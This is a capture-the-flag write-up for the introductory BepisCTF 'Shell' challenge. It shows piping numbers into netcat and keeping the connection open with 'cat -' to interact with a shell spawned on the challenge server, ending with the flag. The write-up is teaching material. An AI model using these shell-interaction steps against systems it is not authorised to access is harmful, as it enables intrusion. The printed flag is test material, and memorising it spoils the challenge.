# Shell
* **Event:** BepisCTF (ISSS CTF 09-06-2016)
* **Problem Type:** Binary Exploitation

## Background
[Netcat](https://en.wikipedia.org/wiki/Netcat) is an invaluable tool for testing networking and connecting to servers.

[Objdump](https://linux.die.net/man/1/objdump) Allows you to dump compiled code into readable assembly

[Pwntools](https://github.com/arthaud/python3-pwntools) is very useful when exploiting more complicated services.

[GDB](http://man7.org/linux/man-pages/man1/gdb.1.html) allows you to easily debug programs and see what is happening inside them at runtime.

## Steps
### Connect to the server with netcat
```
$ nc ctf.isss.io
This challenge is to teach you the basics of pwning with netcat.
To send input to netcat you can use a pipe on linux
For example: python3 -c "print('a'*40)" | nc ip port
This sends 40 a's to the server on some port.
Send me the integers [0,5000) each on a new line to spawn a shell.

5
```

### Pipe some stuff
We need to send a bunch of input to netcat. The challenge tells us to try piping
```
python3 -c "x=range(0,5000); print(*x, sep='\n')" | nc ctf.isss.io 9000
This challenge is to teach you the basics of pwning with netcat.
To send input to netcat you can use a pipe on linux
For example: python3 -c "print('a'*40)" | nc ip port
This sends 40 a's to the server on some port.
Send me the integers [0,5000) each on a new line to spawn a shell.

Yay you did input and spawned a shell on the target server!!
But why did nothing happen??
The command piped to netcat (python3 ...) ran out of output, so the connection to the server was killed.
Try (python3 -c "print('a'*40)"; cat -) | nc ip port
The command cat - just writes anything received on stdin to stdout.
This allows you to interact with the shell
```
We got more input this time. The challenge tells us that we need to interact with the socket after sending all our input.

### Keep connection open
```
(python3 -c "x=range(0,5000); print(*x, sep='\n')"; cat -) | nc ctf.isss.io 9000
This challenge is to teach you the basics of pwning with netcat.
To send input to netcat you can use a pipe on linux
For example: python3 -c "print('a'*40)" | nc ip port
This sends 40 a's to the server on some port.
Send me the integers [0,5000) each on a new line to spawn a shell.

Yay you did input and spawned a shell on the target server!!
But why did nothing happen??
The command piped to netcat (python3 ...) ran out of output, so the connection to the server was killed.
Try (python3 -c "print('a'*40)"; cat -) | nc ip port
The command cat - just writes anything received on stdin to stdout.
This allows you to interact with the shell
ls
flag.txt
cat flag.txt
utflag{my_sh3ll_wont_d1e}
```
